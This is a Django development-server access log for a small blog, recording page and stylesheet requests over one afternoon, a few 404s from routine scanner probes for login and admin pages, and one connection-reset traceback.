[15/Jan/2021 14:23:58] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1488
[15/Jan/2021 14:23:58] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 170
[15/Jan/2021 14:23:59] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:28:08] "GET / HTTP/1.1" 200 1246
[15/Jan/2021 14:28:08] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:28:08] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1488
[15/Jan/2021 14:28:08] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 170
[15/Jan/2021 14:28:08] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
Not Found: /http:/110.242.68.4/
[15/Jan/2021 14:28:25] "HEAD http://110.242.68.4/ HTTP/1.1" 404 1670
Not Found: /login
[15/Jan/2021 14:29:13] "GET /login HTTP/1.0" 404 2121
Not Found: /jenkins/login
[15/Jan/2021 14:29:14] "GET /jenkins/login HTTP/1.0" 404 2145
Not Found: /manager/html
[15/Jan/2021 14:29:14] "GET /manager/html HTTP/1.0" 404 2142
[15/Jan/2021 14:29:28] "GET / HTTP/1.1" 200 1459
[15/Jan/2021 14:29:28] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:29:28] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1488
[15/Jan/2021 14:29:28] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 170
[15/Jan/2021 14:29:28] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:32:01] "GET / HTTP/1.1" 200 1453
[15/Jan/2021 14:32:01] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:32:01] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1488
[15/Jan/2021 14:32:01] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 170
[15/Jan/2021 14:32:02] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:55:37] "GET / HTTP/1.1" 200 1622
[15/Jan/2021 14:55:37] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:55:37] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1488
[15/Jan/2021 14:55:37] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 209
[15/Jan/2021 14:55:38] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:57:44] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 14:57:44] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 14:57:44] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:57:44] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 14:57:44] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 209
[15/Jan/2021 14:57:44] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:58:10] "GET / HTTP/1.1" 200 1695
Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
[15/Jan/2021 15:33:15] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1742
----------------------------------------
Exception happened during processing of request from ('80.82.70.187', 53203)
Traceback (most recent call last):
  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[15/Jan/2021 15:44:42] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 15:44:42] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 15:44:42] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 15:44:42] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 15:44:42] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 358
[15/Jan/2021 15:44:43] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 15:45:29] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 15:45:29] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 15:45:29] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 15:45:29] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 15:45:29] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 446
[15/Jan/2021 15:45:29] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 15:46:04] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 15:46:04] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 15:46:04] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 15:46:04] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 15:46:04] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 446
[15/Jan/2021 15:46:04] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 15:46:04] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 15:46:04] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 15:46:04] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 15:46:04] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 446
[15/Jan/2021 15:46:05] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 15:46:05] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 15:46:05] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 15:46:05] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 15:46:05] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 446
[15/Jan/2021 15:46:06] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 15:46:06] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 15:46:06] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 15:46:06] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 15:46:06] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 446
[15/Jan/2021 15:48:28] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 15:48:28] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 15:48:28] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 15:48:28] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 15:48:28] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 483
[15/Jan/2021 15:48:28] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 15:48:57] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 15:48:57] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 15:48:57] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 15:48:57] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 15:48:57] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 504
[15/Jan/2021 15:48:57] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 15:49:17] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 15:49:17] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 15:49:17] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 15:49:17] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 15:49:17] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 558
[15/Jan/2021 15:49:18] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 15:49:35] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 15:49:35] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 15:49:35] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 15:49:35] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 15:49:35] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 554
[15/Jan/2021 15:49:35] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 15:49:39] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 15:49:39] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 15:49:39] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 15:49:39] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 15:49:39] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 554
[15/Jan/2021 15:49:59] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 15:49:59] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 15:49:59] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 15:49:59] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 15:49:59] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 600
[15/Jan/2021 15:50:00] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 15:50:24] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 15:50:24] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 15:50:24] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 15:50:24] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 15:50:24] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 616
[15/Jan/2021 15:50:24] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 15:50:30] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 15:50:30] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 15:50:30] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 15:50:30] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 15:50:30] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 600
[15/Jan/2021 15:50:30] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 15:50:59] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 15:50:59] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 15:50:59] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 15:50:59] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 15:50:59] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 641
[15/Jan/2021 15:50:59] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 15:51:10] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 15:51:10] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 15:51:10] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 15:51:10] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 15:51:10] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 640
[15/Jan/2021 15:51:11] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 15:51:20] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 15:51:20] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 15:51:20] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 15:51:20] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 15:51:20] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 641
[15/Jan/2021 15:51:20] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 15:51:32] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 15:51:32] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 15:51:32] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 15:51:32] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 15:51:32] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 641
[15/Jan/2021 15:51:32] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 15:52:38] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 15:52:38] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 15:52:38] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 15:52:38] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 15:52:38] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 670
[15/Jan/2021 15:52:38] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 15:54:38] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 15:54:38] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 15:54:38] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 15:54:38] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 15:54:38] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 641
[15/Jan/2021 15:54:39] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 15:55:05] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 15:55:05] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 15:55:05] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 15:55:05] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 15:55:05] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 663
[15/Jan/2021 15:55:05] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 15:55:11] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 15:55:11] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 15:55:11] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 15:55:11] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 15:55:11] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 663
[15/Jan/2021 15:55:12] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 15:55:17] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 15:55:17] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 15:55:17] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 15:55:17] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 15:55:17] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 663
[15/Jan/2021 15:55:18] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 15:55:30] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 15:55:30] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 15:55:30] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 15:55:30] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 15:55:30] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 663
[15/Jan/2021 15:55:31] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 15:57:32] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 15:57:32] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 15:57:32] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 15:57:32] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 15:57:32] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 663
[15/Jan/2021 15:57:32] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 15:58:12] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 15:58:12] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 15:58:12] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 15:58:12] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 15:58:12] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 686
[15/Jan/2021 15:58:12] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 15:58:32] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 15:58:32] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 15:58:32] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 15:58:32] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 15:58:32] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 686
[15/Jan/2021 15:58:32] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 15:58:41] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 15:58:41] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 15:58:41] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 15:58:41] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 15:58:41] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 687
[15/Jan/2021 15:58:41] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 15:58:48] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 15:58:48] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 15:58:48] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 15:58:48] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 687
[15/Jan/2021 15:58:48] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 15:58:48] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 15:59:02] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 15:59:02] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 15:59:02] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 15:59:02] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 15:59:02] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 687
[15/Jan/2021 15:59:02] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 16:00:30] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 16:00:30] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 16:00:30] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 16:00:30] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 16:00:30] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 725
[15/Jan/2021 16:00:31] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 16:02:19] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 16:02:19] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 16:02:19] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 16:02:19] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 16:02:19] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 749
[15/Jan/2021 16:02:19] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 16:02:25] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 16:02:25] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 16:02:25] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 16:02:25] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 16:02:25] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
[15/Jan/2021 16:02:25] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 16:03:01] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 16:03:01] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 16:03:01] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 16:03:01] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 16:03:01] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
[15/Jan/2021 16:03:03] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 16:03:03] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 16:03:03] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 16:03:03] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 16:03:03] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
[15/Jan/2021 16:06:51] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 16:06:51] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 16:06:51] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 16:06:51] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 16:06:51] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
[15/Jan/2021 16:06:51] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 16:06:56] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 16:06:56] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 16:06:56] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 16:06:56] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 16:06:56] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
[15/Jan/2021 16:06:56] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 16:07:10] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 16:07:10] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 16:07:10] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 16:07:10] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 16:07:10] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
[15/Jan/2021 16:07:10] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 16:07:38] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 16:07:38] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 16:07:38] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 16:07:39] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1057
[15/Jan/2021 16:07:39] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
[15/Jan/2021 16:07:39] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
Not Found: /manager/html
[15/Jan/2021 16:08:47] "GET /manager/html HTTP/1.1" 404 2143
[15/Jan/2021 16:09:20] "GET / HTTP/1.1" 200 1716
[15/Jan/2021 16:09:20] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 16:09:20] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 16:09:20] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1055
[15/Jan/2021 16:09:20] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 890
[15/Jan/2021 16:09:21] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 16:09:57] "GET / HTTP/1.1" 200 1695
[15/Jan/2021 16:09:57] "GET /static/css/blog_font.css HTTP/1.1" 200 433
[15/Jan/2021 16:09:57] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 16:09:57] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1055
[15/Jan/2021 16:09:57] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
[15/Jan/2021 16:09:58] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
